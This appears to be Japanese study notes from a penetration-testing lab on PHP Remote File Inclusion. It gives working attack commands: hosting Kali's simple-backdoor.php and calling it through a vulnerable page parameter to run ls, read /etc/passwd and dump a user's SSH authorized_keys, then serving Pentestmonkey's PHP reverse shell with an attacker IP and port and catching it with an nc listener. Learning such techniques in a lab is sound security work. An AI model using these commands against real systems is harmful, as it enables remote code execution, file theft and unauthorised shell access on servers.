# 概要
- Remote File Inclusion (RFI) は、リモートのファイルをサーバーに含めて、任意のコードを実行する攻撃手法。
- RFI を利用するには **allow_url_include**オプションを有効にする必要がある。
```ini
allow_url_include = Off
```
- Kali Linuxに**は、/usr/share/webshel​​ls/php/**ディレクトリに RFIに使用できるPHP_ウェブシェルが複数含まれている。
- Webシェルは、ウェブベースのコマンドラインインターフェースを提供する小さなスクリプト
---
# 例１ 既存のWebシェルファイルを利用したRFI

## 手順
1. 攻撃者側の準備
-　Webシェルファイルの準備
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
```
- Webサーバの準備
```bash
python3 -m http.server 80
```
2. RFIの実行
```bash
# ls
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

# cat /etc/passwd
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"

# コマンドの結果の１行のみ出力したい場合
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=whoami" | grep "<pre>"

# ユーザ（elaine）のauthorized_key
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
```

---
# 例２ Pentestmonkeyの活用
## 1. 攻撃者側の準備
-　Webシェルファイルの準備
```bash
# ファイルのコピー
cp ~/github/ReverseShell/php-reverse-shell/php-reverse-shell.php ./

# 該当行を変更
# $ip変数 Kali マシンの IP アドレス
# $portを 4444 
$ip = '192.168.45.204';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```
- Webサーバの準備
```bash
python3 -m http.server 80
```
- netcatの準備
```bash
nc -nlvp 4444
```

2. RFIの実行
```bash
curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.204/php-reverse-shell.php"
```

---

### 参考サイト
- Qiita - LFI攻撃
- Hacking Articles - Local File Inclusionの包括的ガイド
- Medium - Local File Inclusion (LFI) Web Application Penetration Testing
